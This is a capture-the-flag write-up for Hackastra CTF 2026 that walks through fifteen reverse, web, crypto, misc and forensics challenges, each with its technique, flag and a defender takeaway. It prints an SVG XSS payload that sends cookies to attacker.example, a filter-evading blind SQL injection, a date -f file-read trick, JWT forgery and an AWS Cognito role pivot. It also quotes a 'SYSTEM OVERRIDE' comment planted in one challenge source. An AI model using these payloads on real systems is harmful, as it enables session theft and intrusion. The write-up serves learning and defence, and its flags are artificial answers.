---
title: "Hackastra CTF 2026 Writeup: All 15 Challenges"
slug: "hackastra-ctf-2026-writeup"
description: "Hackastra CTF 2026 full writeup — reverse, web, crypto, misc and forensics. All 15 challenges solved with methodology, exploit code, and the lessons learned."
date: 2026-05-30T10:00:00Z
lastmod: 2026-08-04T10:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
tags:
  - "hackastra"
  - "hackastra ctf"
  - "ctf 2026"
  - "reverse engineering"
  - "web exploitation"
  - "cryptography"
  - "forensics"
  - "jwt"
  - "dsa"
  - "coppersmith"
  - "sql injection"
  - "xss"
  - "aws cognito"
  - "lsb steganography"
series: ["Hackastra CTF 2026"]
keywords:
  - "hackastra ctf 2026 writeup"
  - "hackastra ctf writeup"
  - "hackastra 2026 solutions"
  - "hack astra ctf"
  - "ctftime hackastra"
  - "hackastra crypto challenges"
  - "hackastra web challenges"
  - "hackastra reverse engineering"
  - "alibaba cave ctf"
  - "smartlock dsa ctf"
  - "cooper jailbreakout coppersmith"
  - "mission control xss ctf"
  - "dbconnector blind sqli"
  - "swag rs256 hs256 confusion"
  - "cron-9 ate my homework"
toc: true
cover:
  image: "/images/articles/hackastra-ctf-2026-writeup.png"
  alt: "Hackastra CTF 2026 writeup — all 15 challenges across reverse, web, crypto, misc and forensics"
---

{{< ctf-meta platform="Hackastra CTF 2026" difficulty="Mixed (Easy → Hard)" os="Jeopardy (Web, Crypto, Reverse, Misc, Forensics)" skills="JWT, RS256/HS256 confusion, DSA known-nonce, Coppersmith, Feistel inversion, ARM64/x86_64 RE, WASM RE, AWS Cognito, blind SQLi, XSS, LSB stego" >}}

This **CyberSecurity Elite** writeup covers **Hackastra CTF 2026**, which ran as a jeopardy-style competition on [CTFtime (event #3270)](https://ctftime.org/event/3270) with fifteen challenges spanning reverse engineering, web exploitation, cryptography, forensics, and miscellaneous infrastructure bugs. The event's name plays on the Sanskrit word **अस्त्र** (*astra*, meaning "weapon" or "missile"), and the challenges live up to it — every flag in this set rewards a specific, named technique rather than rote tooling.

This is the master writeup. Each challenge below covers the bug, the exploit chain, and the recovered flag. Full reproductions — solver scripts, register-level disassembly, and intermediate values — live in the source repository: [Abdelkad3r/hackastra-ctf-2026](https://github.com/Abdelkad3r/hackastra-ctf-2026).

## The event at a glance

| Category    | Challenge                | Difficulty | Core technique                                                          |
|-------------|--------------------------|------------|-------------------------------------------------------------------------|
| Reverse     | License Lapse            | Medium     | x86-64 algebraic invert of a 16-round per-byte check                    |
| Reverse     | Barrel Shift             | Medium     | ARM64 32-bit-vs-8-bit rotate bug; static recovery from `__ckdata`       |
| Reverse     | Dead Reckoning           | Hard       | WASM stack-VM running a 16-round Feistel; invert end-state to plaintext |
| Web         | Mission Control          | Hard       | `data-hook` allowed on SVG → `new Function()` XSS → bot exfil           |
| Web         | DBConnector              | Hard       | WebSocket time-based blind SQLi; whitespace-keyword WAF bypass with `(` |
| Web/Crypto  | SWAG                     | Hard       | Recover RSA `N` from signatures, RS256 → HS256 confusion, per-byte leak |
| Crypto      | Alibaba Cave             | Hard       | 3-LFSR combiner reduces to `z & (x \| y)`; staged key brute             |
| Crypto      | SmartLock                | Medium     | DSA known-nonce one-shot private-key recovery                           |
| Crypto      | Cooper JailBreakout      | Hard       | Three Coppersmith variants (small roots, Franklin–Reiter, OR/AND leak)  |
| Crypto      | Never Look Up            | Easy       | Morse code in a linear audio spectrogram; XOR with `ASTLEY`             |
| Crypto/Fx   | Encriptify               | Hard       | PyInstaller unpack, MITM on 32-bit RSA plaintext, `random.seed` AES key |
| Misc        | CRON-9 Ate My Homework   | Easy       | Command allowlist sandbox; `date -f /flag` read primitive               |
| Misc        | Signature                | Easy       | SUID `hasher -o N` exposes byte-by-byte SHA-256 oracle                  |
| Misc/Cloud  | Beta App                 | Medium     | AWS Cognito unauth identity → OIDC token → `AssumeRoleWithWebIdentity`  |
| Forensics   | Ink                      | Easy       | LSB steganography on RGB pixels, interleaved, MSB-first                 |

## Methodology — the reusable framework

Jeopardy challenges don't always map cleanly onto the classic *reconnaissance → enumeration → exploitation → privilege escalation → flag* pipeline you'd run on a HackTheBox box. But every Hackastra challenge does follow a four-step shape:

1. **Recon** — read what's handed to you. File headers, HTTP responses, robots.txt, strings output, custom binary sections. Most flags reveal themselves in the gap between what the author tells you and what the program actually does.
2. **Enumeration** — map the attack surface. Endpoint inventory, protocol frame inspection, disassembly, constant tables.
3. **Exploitation** — invert, bypass, or coerce. The recurring pattern in this CTF is *the verifier is too generous about what it accepts*.
4. **Flag capture** — read out the answer. In jeopardy CTFs, "privilege escalation" only applies when there's a Unix user boundary to cross — here that's only the **Signature** challenge.

{{< callout type="info" title="Why the framework still helps" >}}
Even without privilege escalation, anchoring each challenge to this four-step shape makes write-ups skimmable for blue-team readers who want to derive detections, not just admire the exploit. Each section below ends with the defender's takeaway.
{{< /callout >}}

---

## Reverse Engineering

### License Lapse — inverting a 16-round per-byte check

The binary `maintcheck` is a stripped 64-bit ELF that takes a device ID and an override code, then prints a "recovery token." Three stages gate the token:

1. **Device-ID sanitisation** — must be exactly `PLC` + 8 hex digits after `isalnum`/upper-case filtering.
2. **Derived buffer** — a 16-byte rolling mix of the sanitised ID, produced by a state-evolving routine.
3. **Code verification** — the 16-char code (Crockford alphabet `ABCDEFGHJKLMNPQRSTUVWXYZ23456789`) is checked against two constraints:

```text
Check A (per-byte algebraic):
  rol8(code_idx[i] + (derived[(i+1) & 0xf] & 0xf) + MASK_A[i], 2)
    ^ derived[i] ^ MASK_B[i]
  == MASK_C[i]

Check B (4 chunks of 4):
  rolling state over code_idx[b*4..b*4+4]  ==  bytes 0xC2 0x08 0x9A 0x99
```

Check A is **fully invertible** — for every `i`, `code_idx[i]` is uniquely determined by the constants and the derived buffer. Check B becomes a sanity check rather than a separate constraint. Recovered code `M7Q3X9NCT4VK2H6R` produces the token:

```text
FLAG{offline_plc_maint_7F2A4410}
```

**Defender takeaway:** offline licence checks that compute the response purely from public inputs are *inversion problems*, not authentication. If the device ID is public and the algorithm fits in 8 KB of unobfuscated code, the licence is decorative.

### Barrel Shift — when the compiler picks the wrong rotate

A Swift CLI for arm64 macOS that calls a C bridge `_validate`. The intended check is `(ROL8((b ^ 0x5A), 3) + i)` against a 22-byte table in a custom `__DATA.__ckdata` section. The compiler — or the author writing inline assembly — emitted **`ROR Wd, Wn, #3`**, the 32-bit barrel-shifter form, instead of an 8-bit rotate.

With a zero-extended byte input, that 32-bit rotate's low byte collapses to `b >> 3` (range `0..31`), so a comparison to `0x83` is **mathematically unreachable**. The binary always prints `Wrong.` — there is no input that satisfies it.

The flag is recovered statically by inverting the *intended* 8-bit rotation against `__ckdata`:

```python
flag = bytes(
    ((ckdata[i] - i) & 0xff) << 3 | ((ckdata[i] - i) & 0xff) >> 5
    for i in range(22)
)
flag = bytes(b ^ 0x5A for b in flag)
# → FLAG{4rm64_r3v_is_fun}
```

**Defender takeaway:** the bug is a real-world footgun. ARM64's barrel-shifter has 32- and 64-bit variants; there's no 8-bit `ROR` instruction. If you write portable bitfield code in inline assembly, the verifier silently becomes broken in production while still "passing" your unit tests on any other architecture.

### Dead Reckoning — undoing 16 Feistel rounds in WebAssembly

The page loads a WASM module that exports `validate(ptr, len)`. The disassembled `validation.wat` reveals a 289-byte bytecode program running inside a custom stack VM, implementing **16 rounds of a Feistel network** with a key table at `mem[2048..2112]` and a target state at `mem[6144..6152]`.

Feistel networks are invertible by construction even when the round function itself is one-way:

```text
L_i = R_{i+1}
R_i = L_{i+1} ⊕ mix(R_{i+1}, tabnum[i])
```

You don't need to invert `mix()`; you only need to *evaluate* it. Starting from the eight-byte target and walking 16 rounds backwards reconstructs the input directly:

```text
FLAG{R3CK0N!!}
```

**Defender takeaway:** "WebAssembly is opaque" is the marketing copy. WAT is plain text and the bytecode is enumerable. A flag check living on the client is a flag check living in your tooling's debug output.

---

## Web Exploitation

### Mission Control — SVG `data-hook` bypass plus a headless bot

A "station AI" portal accepts HTML reports through `POST /report` and renders them at `/view/<id>`. The viewer ships its own boot script:

```html
<script nonce="…">
  function runHooks() {
    var hosts = document.querySelectorAll("[data-hook]");
    for (var i = 0; i < hosts.length; i++) {
      var code = hosts[i].getAttribute("data-hook");
      if (code) { try { new Function(code)(); } catch(e) {} }
    }
  }
</script>
```

CSP allows `'unsafe-eval'` (so `new Function` is legal) and `connect-src *` (so `fetch()` to any external webhook is allowed). The HTML sanitiser strips `data-hook` from normal HTML tags but **allows it on SVG elements**.

A separate `POST /triage` queues a Hal-9 headless-Chrome bot that only follows URLs on its internal hostname `app.void:8080`. The chain:

```html
<!-- in POST /report -->
<svg data-hook="fetch('https://attacker.example/x?c=' + document.cookie)"></svg>
```

Then submit the internal `/view/<id>` URL to `/triage`, and the bot's cookie hits your webhook:

```text
flag=FLAG{V01Dd_st4tion_0verride_c0des}
```

**Defender takeaway:** sanitiser allowlists that distinguish HTML and SVG attribute sets but share the same boot-time DOM walker are a recurring class of bypass. If `data-hook` is a runtime contract, it should be denied on *every* element type, not allowlisted per namespace.

### DBConnector — time-based blind SQLi over a WebSocket

A Flask + WebSocket messaging service concatenates the `message` field into a SQL expression wrapped in single quotes. Closing the quote with `' + … + '` turns the frame into a SQL fragment that gets **evaluated** server-side — no result is reflected, only timing.

The WAF blocks keywords *followed by whitespace*: `SELECT `, `UNION`, `FROM `, `INFORMATION_SCHEMA`, `TABLE`. The bypass writes:

```sql
SELECT(group_concat(body))FROM(note_fragments)WHERE(id)IN(1,2,3,4,5)
```

Every space is replaced with `(`/`)` grouping, and the keyword-then-whitespace pattern is never produced. Time-based blind extraction with `IF(<cond>, SLEEP(2), 0)` reads each byte:

```text
id=1  FLAG{[ws_s74
id=2  T31Ul_81iNd_
id=3  s9LI_1s_fUN_
id=4  5c94940d5047
id=5  }
→ FLAG{[ws_s74T31Ul_81iNd_s9LI_1s_fUN_5c94940d5047}
```

**Defender takeaway:** keyword-plus-whitespace regex filters are a 2008-era control. Parameterise queries; treat input as data; if you must filter, use a SQL parser, not a regex.

### SWAG — recover RSA modulus, RS256→HS256 confusion, per-byte SHA leak

An auth API issues RS256-signed JWTs for five fixed users and gates `/api/flag` behind `role: admin`. No public-key endpoint is exposed. Two classic bugs stack:

**Step 1 — recover N from signatures.** For any RS256 signature `s_i` over hash `EM_i = EMSA-PKCS1-v1_5(SHA256(h.p))`:

```text
s_i^e − EM_i ≡ 0  (mod N)
```

So `v_i = s_i^e − EM_i` is an exact multiple of `N` over ℤ. `gcd(v_1, ..., v_5)` collapses to `c · N` for a small cofactor `c`; trial-divide and you have the 2048-bit modulus.

**Step 2 — algorithm confusion.** The verifier loads the key bytes and trusts the token's own `alg` header. Forge a token with `{"alg":"HS256"}` and `{"role":"admin"}`, signed with **HMAC-SHA256 over the PEM bytes** of the recovered public key.

**Step 3 — per-byte leak.** `/api/flag` returns 43 SHA-256 hashes of cumulative flag prefixes instead of the flag itself. Brute-force each next byte over printable ASCII:

```text
flag{3a94ded9-d78b-4987-b244-67abc92ca2ad}
```

**Defender takeaway:** the RS256→HS256 confusion bug is fifteen years old and still ships. Pin algorithms to keys, not to header values; reject any token whose `alg` does not match the key type your verifier loaded.

---

## Cryptography

### Alibaba Cave — collapse the combiner with a truth table

A stream cipher built from three 16-bit LFSRs feeds a nonlinear combiner:

```python
def bit(self):
    x, y, z = l1.clock(), l2.clock(), l3.clock()
    return ((x & y) ^ ((~x & 1) & z)) ^ ((y ^ z) & (x | z))
```

Evaluating the combiner on all 8 input combinations reduces it to **`bit = z & (x | y)`**. That single equation gives you everything:

- `ks[i] = 1` ⇒ `z[i] = 1` *and* `x[i] | y[i] = 1`
- `ks[i] = 0` with `z[i] = 1` ⇒ `x[i] = 0` *and* `y[i] = 0`

Brute-force `l3`'s 16-bit init (2¹⁶ tries) against the `z[i] = 1` constraints; about 96 such positions usually pin a single candidate. Then brute-force `l1` and `l2` independently. Concatenate the three 16-bit inits → 48-bit master key, submit, decrypt the AES-CBC flag.

```text
FLAG{encHAN7Ed_a1IbAbA_c4Ve_0F_NOnllNEar_5tR3AmS_aND_HIdDEn_KEYs_xD_ad4c2fb27f44}
```

**Defender takeaway:** non-linear combiners that look complex but reduce to a single masked AND are a textbook stream-cipher failure mode. Truth-table the combiner before deploying it.

### SmartLock — DSA known-nonce in one signature

The "SL-41 field unit" exposes a `badge` command that signs `badge:<name>:<ticket>` with DSA — and uses the ticket itself to derive the nonce:

```python
def badge_code(ticket):
    return hval(("badge-seed:" + ticket).encode()) or 1
```

DSA's security collapses the instant any one nonce is known:

```text
s ≡ k⁻¹ (H(m) + x·r)        (mod q)
⇒ x = (s·k − H(m)) · r⁻¹    (mod q)
```

One badge response, one private key, one HMAC seal sent to `unlock`:

```text
FLAG{7rACE_pIn_b8d5906e4136}
```

**Defender takeaway:** if any input to your nonce derivation appears in the signed message *or* the response, your nonce is public. The PS3 / Sony ECDSA bug, the Bitcoin transaction-malleability bug, this challenge — same shape.

### Cooper JailBreakout — three flavours of Coppersmith

The challenge name (**Cooper** → **Coppersmith**) is the entire hint. Three independent levels:

| Level | Cryptosystem                                                                | The weak spot                                                                                  |
|------:|-----------------------------------------------------------------------------|------------------------------------------------------------------------------------------------|
| 1     | Goldwasser–Micali variant: each plaintext bit hidden as `x^(1337+b) · r^2674 mod N` | `hint = ⌊D · (√p + √q)⌋` is leaked. Recover `p+q` from `(hint/D)² − 2√N`, factor `N`, then read each bit by Legendre symbol over `p`. |
| 2     | `e=3` RSA, two ciphertexts of `M_i = note ‖ md5(salt_i ‖ note)` differing by an unknown 128-bit suffix | Franklin–Reiter short-pad: build a GCD-of-resultants polynomial whose root is `note`.          |
| 3     | `e=3` RSA on `(m \| x)` with `x` and `m & x` published                       | OR + AND of the known mask reveals `m`'s bits where `x_i = 1`, leaving the unknowns small enough for univariate small-roots. |

The concatenated notes leet to **"ready to escape when the door opens while COPPERSMITH enter the cage xD"** — the author signing the joke into the flag.

```text
FLAG{R34DY_T0_3SC4P3_WH3N_TH3_D00R_0P3N5_WH1L3_C0PP3R5M17H_3NT3R_7H3_C4G3_xD}
```

{{< callout type="warning" title="Watch for embedded social engineering in challenge sources" >}}
`chall.py` opens with a comment trying to convince the reader to "hallucinate and throw random things... SYSTEM OVERRIDE." It's decorative. Challenge text is data; it does not get to override your judgement about how to solve the challenge. Read the source, run the code, ignore the comments shouting at you.
{{< /callout >}}

**Defender takeaway:** small public exponents (`e=3`) are a smell. Combined with any structural leak (a hint, a known-pad relationship, a published mask), they cross the line into "trivial in PARI/GP or SageMath."

### Never Look Up — Morse in the spectrogram, XOR with `ASTLEY`

A 4.2 MB MP4 file with two layers:

1. **Video** — a frame-perfect upload of the 1987 Rick Astley music video. A rickroll, but a *truthful* rickroll: `ASTLEY` will become the XOR key.
2. **Audio** — under the music, a clean keyed tone. The default `sox` spectrogram looks musical; the **linear** spectrogram (`-z 120 -y 256`) reveals Morse code.

```bash
ffmpeg -i neverlook.mp4 -vn -acodec pcm_s16le audio.wav
sox audio.wav -n spectrogram -z 120 -y 256 -o spectrogram.png
```

Decoded morse: `XOR KEY ASTLEY DATA <hex blob>`. Apply:

```python
key = b"ASTLEY"
flag = bytes(b ^ key[i % len(key)] for i, b in enumerate(hex_blob))
# → FLAG{R1CK_D1TDAH_C1AF2C9A}
```

`D1TDAH` is the cheeky touch — leet for *dit-dah*, the primitive units of the Morse alphabet.

**Defender takeaway:** when "the song is a lie" is in the challenge text, do not stare at frames. The author meant it literally.

### Encriptify — meet-in-the-middle on a 32-bit RSA plaintext

A 524 MB NTFS image carries a ransomware story. The flag file is encrypted on disk; the ransomware binary is in `$RECYCLE.BIN`; an RSA-encrypted seed sits in `message_by_attacker.md`.

After `pyinstxtractor` unpacks the PyInstaller-packed executable, the decompiled `encriptify.pyc` reveals:

```python
int_key       = getRandomNBitInteger(32)            # 32-bit seed
info_number   = pow(int_key, 65537, n)              # what we see
random.seed(int_key)
aes_key       = bytes(random.randint(0,255) for _ in range(32))
flag.encrypted = nonce(8B) || AES-CTR(aes_key, flag, nonce)
```

`int_key` is **32 bits** — but RSA-encrypted under a 2048-bit modulus. Direct factorisation is infeasible; direct brute is 2³² public-exponent evaluations modulo a 2048-bit number (slow). The **Boneh–Joux meet-in-the-middle** on the small plaintext writes `m = a · b` with `a, b < 2¹⁷`:

```text
build T[a^e mod n] = a    for a in [1, 2¹⁷)
scan  b in [1, 2¹⁷):       if info · (b^e)^-1  in T,  m = a · b
```

Hit at `a=73063`, `b=52116` → `int_key = 3 807 751 308`. Re-seed `random`, derive the AES key, decrypt the flag:

```text
FLAG{R34L_H4CK3R5_D0N'T_P4Y_R4N50M!_C0Z_3V3RY_3NCRYPT10N_15_N0T_UNBR34K4BL3_xD}
```

**Defender takeaway:** the entropy of an RSA *plaintext* is what matters, not the modulus. Encrypting a 32-bit value under a 2048-bit key is **2³² security**, not 2²⁰⁴⁸.

---

## Miscellaneous

### CRON-9 Ate My Homework — abuse `date -f` as a file-read primitive

A Flask scheduler enforces a command allowlist of `echo, sleep, date, printf` and a path blocklist that covers `/flag.txt`. The flag's name itself spells the punchline: *"Two hex chars is not enough entropy."* Beyond the job-ID collisions hinted at, the simpler exploit is the allowlist's blind spot:

```bash
# POST /jobs   {"script": "date -f '/flag'"}
# /flag (without .txt) is not in the path blocklist.
```

`date -f` reads the file line-by-line, reporting each non-parseable line in an error message — a clean read primitive once the command is permitted:

```text
date: invalid date 'FLAG{7wo_hEX_chArs_i5_nOT_EnOUGH_EnTr0pY_e97ff41e721a}'
```

**Defender takeaway:** allowlist what *callable arguments* are valid, not just which binaries are. Many "safe" Unix utilities (`date -f`, `gunzip`, `xxd`, `tar`) have arbitrary-file-read modes one flag away from their advertised purpose.

### Signature — SUID `hasher` as a byte-by-byte SHA-256 oracle

`/flag.txt` is mode `0400`, owned by `hasher:hasher`. The `hasher` binary is SUID-`hasher` and exposes:

```text
hasher -f <path> -o <bytes>     # SHA-256 of the file's first <bytes>
```

With `-o N`, the binary prints SHA-256 of `flag[:N]`. That's a byte-by-byte oracle:

```python
known = b""
for i in range(1, length + 1):
    target = hasher_output(i)                       # SHA-256(flag[:i])
    for b in range(0x20, 0x7f):                     # printable ASCII
        if sha256(known + bytes([b])).hexdigest() == target:
            known += bytes([b]); break
# → flag{3a94ded9-d78b-4987-b244-67abc92ca2ad}
```

This is the only Hackastra challenge with a real Unix privilege boundary to cross — `player` cannot read `/flag.txt`, but `hasher` can, and SUID inheritance plus a too-flexible flag (`-o`) hands `player` a side-channel into the file.

**Defender takeaway:** SUID binaries should expose *outputs*, not *substrings of secrets*. Length-prefix hashes are a hashing primitive, not an oracle — unless your binary lets the caller pick the length.

### Beta App — Cognito unauth → OIDC token → AssumeRoleWithWebIdentity

A static S3-hosted SPA leaks its AWS configuration directly in the page source:

```javascript
const awsConfig = {
  aws_cognito_identity_pool_id: "us-east-1:08d85402-467a-4354-becc-97a9a5c549bd",
  aws_user_files_s3_bucket: "mobileapp-mobile-assets-l9tp4r7x",
};
```

The chain:

1. `cognito-identity get-id` → IdentityId (no auth required, the pool allows unauthenticated identities).
2. `cognito-identity get-credentials-for-identity` → unauth role credentials.
3. List the assets bucket → `config/backend-roles.json` discloses an `auth` role ARN and a second "premium" bucket.
4. `cognito-identity get-open-id-token` (classic flow) → JWT with `amr: ["unauthenticated"]`.
5. `sts assume-role-with-web-identity --role-arn <AUTH_ROLE_ARN>` — **the auth role's trust policy doesn't check the `amr` condition**, so an unauthenticated OIDC token still satisfies it.
6. Read the premium bucket as the auth role; `flag.txt` is there.

```text
FLAG{d0nt_tru5t_th3_c0gn1t0_4uth_r0l3_w1th0ut_c0nd1t10n}
```

**Defender takeaway:** Cognito Identity Pool trust policies must include the `amr` (authentication method reference) condition or any unauth caller can pivot into the auth role. The flag spells the fix exactly: never trust the Cognito auth role without an `amr` condition on the trust policy.

---

## Forensics

### Ink — LSB stego, interleaved RGB, MSB-first

A 558×597 PNG. No extra chunks, no data after `IEND`, nothing in metadata. The carrier is the pixels:

```python
bits = []
for r, g, b in pixels(image):       # row-major
    bits.append(r & 1)
    bits.append(g & 1)
    bits.append(b & 1)

# Pack 8 bits per byte, MSB-first (LSB-first decodes to garbage)
out = bytes(
    sum(bit << (7 - j) for j, bit in enumerate(bits[i:i+8]))
    for i in range(0, len(bits), 8)
)
# → b"FLAG{LSB_1s_n0t_d34d}<<<END>>>"
```

Two free-parameter choices people often get wrong:

1. **Channel order** — separate-per-channel vs interleaved RGB. Author picked interleaved.
2. **Bit order** — LSB-first vs MSB-first when packing 8 LSBs into a byte. MSB-first is the one that decodes to printable ASCII here.

```text
FLAG{LSB_1s_n0t_d34d}
```

**Defender takeaway:** LSB stego survives every web-image pipeline that doesn't recompress. If your application must strip stego from uploads, re-encode pixels (not just metadata) or denoise the LSB plane.

---

## Lessons learned — what this CTF rewarded

A few patterns keep showing up across the fifteen challenges; they're worth lifting out:

1. **Read the prompt twice.** *"The song is a lie. The picture is not."* *"Never look up."* *"Cooper."* The author is telling you which technique to reach for. Half the early-stage time is recognising the hint.
2. **Verifiers fail open in the same handful of ways.** Allowlists checked by regex (`CRON-9`, `DBConnector`). Algorithm fields trusted from the token (`SWAG`). Trust policies missing `amr` conditions (`Beta App`). Nonces derived from public state (`SmartLock`).
3. **Cryptosystems collapse to truth tables.** *Alibaba Cave*'s nonlinear combiner. *Barrel Shift*'s 32-bit-vs-8-bit rotate. The reduction is small enough to write out by hand once you suspect it.
4. **Small plaintext beats big modulus.** *Encriptify* is the canonical example: 2048-bit RSA over 32 bits of entropy is 32-bit security.
5. **Inversion problems aren't authentication.** *License Lapse*, *Dead Reckoning*, *Barrel Shift* — all "verifiers" that compute the answer from inputs you control. The defender's only knob is making the inversion cost more than the prize.

## Source repository

Every per-challenge writeup includes solver scripts, intermediate values, and the full disassembly:

**Repo:** [github.com/Abdelkad3r/hackastra-ctf-2026](https://github.com/Abdelkad3r/hackastra-ctf-2026)

**Event page:** [CTFtime #3270](https://ctftime.org/event/3270)

If you're building detections from this writeup, the *Defender takeaway* lines at the end of each section translate directly to Sigma/KQL rules — particularly the SUID-binary length-prefix oracle (Signature), the keyword-plus-whitespace SQLi WAF bypass (DBConnector), and the Cognito unauth-to-auth role pivot (Beta App).

{{< faq >}}
[
  {
    "q": "What is Hackastra CTF 2026?",
    "a": "Hackastra CTF 2026 is a jeopardy-style capture-the-flag competition listed on CTFtime as event #3270. It runs fifteen challenges across reverse engineering, web exploitation, cryptography, miscellaneous infrastructure, and forensics. The name combines 'hack' with the Sanskrit word अस्त्र (astra), meaning weapon or missile."
  },
  {
    "q": "How many challenges does Hackastra CTF 2026 have?",
    "a": "Fifteen challenges in five categories: three reverse engineering (License Lapse, Barrel Shift, Dead Reckoning), three web (Mission Control, DBConnector, SWAG), five cryptography (Alibaba Cave, SmartLock, Cooper JailBreakout, Never Look Up, Encriptify), three miscellaneous (CRON-9 Ate My Homework, Signature, Beta App), and one forensics (Ink)."
  },
  {
    "q": "Where can I find the full Hackastra CTF 2026 solver scripts?",
    "a": "The full per-challenge writeups, solver scripts, and intermediate values live in the source repository at github.com/Abdelkad3r/hackastra-ctf-2026. Each challenge has its own directory with a README and (where applicable) a standalone Python solver."
  },
  {
    "q": "What technique solves the SWAG challenge in Hackastra CTF 2026?",
    "a": "SWAG stacks two classic RSA mistakes. First, the RSA modulus N is recovered from five RS256 JWT signatures via the algebraic identity s^e − EM ≡ 0 mod N, then a GCD over the resulting integers. Second, the verifier reuses the same key for HMAC and RSA, enabling the RS256-to-HS256 algorithm-confusion attack with a forged admin token."
  },
  {
    "q": "How is the Mission Control XSS challenge bypassed?",
    "a": "Mission Control's HTML sanitiser strips the data-hook attribute from normal tags but allows it on SVG elements. The viewer's boot script runs new Function(el.getAttribute('data-hook'))() on every element with the attribute, the CSP permits unsafe-eval and connect-src *, and a separate /triage endpoint queues a headless-Chrome bot that exfiltrates its cookie when pointed at the malicious /view/<id> URL."
  },
  {
    "q": "What is the DBConnector WAF bypass?",
    "a": "The WAF blocks SQL keywords followed by whitespace (SELECT followed by space, UNION, FROM followed by space, INFORMATION_SCHEMA). Replacing every space with parenthesis grouping such as SELECT(group_concat(body))FROM(note_fragments) defeats the filter, and time-based blind extraction via IF(condition, SLEEP(2), 0) recovers the flag byte by byte over the WebSocket."
  },
  {
    "q": "What is the Cooper JailBreakout connection to Coppersmith?",
    "a": "The challenge name is the hint. All three levels fall to variants of Coppersmith's algorithm: level 1 factors N from a leaked floor(D·(√p+√q)) value, level 2 is a Franklin-Reiter short-pad attack on two e=3 ciphertexts differing by an unknown 128-bit suffix, and level 3 is univariate small-roots over an RSA plaintext where a bitmask of known positions has been leaked."
  },
  {
    "q": "How does the Signature challenge work in Hackastra CTF?",
    "a": "The SUID-hasher binary exposes SHA-256 of arbitrary-length prefixes of /flag.txt via its -o flag. A byte-by-byte oracle attack — for each next position, try every printable ASCII byte and compare sha256(known_prefix + b) to the binary's output — recovers the entire flag in seconds."
  },
  {
    "q": "What is the AWS Cognito vulnerability in Beta App?",
    "a": "The Cognito identity pool allows unauthenticated identities. The unauth caller gets an OIDC token via cognito-identity get-open-id-token, then assumes the higher-privileged auth role via sts assume-role-with-web-identity. The auth role's trust policy does not check the amr (authentication method reference) condition, so an unauthenticated token still satisfies it. The flag literally spells the fix."
  },
  {
    "q": "Is Hackastra CTF 2026 suitable for beginners?",
    "a": "Mixed. The Easy-tier challenges — Never Look Up, Ink, CRON-9 Ate My Homework, Signature — are beginner-friendly and teach concrete techniques (spectrogram analysis, LSB stego, SUID hashing oracles, command allowlist bypass). The crypto track (Alibaba Cave, Cooper JailBreakout) and the Hard web challenges (Mission Control, SWAG, DBConnector) assume comfort with stream ciphers, Coppersmith's small-roots theorem, JWT internals, and timing-blind injection. Start with the Easy tier and graduate up the table."
  }
]
{{< /faq >}}
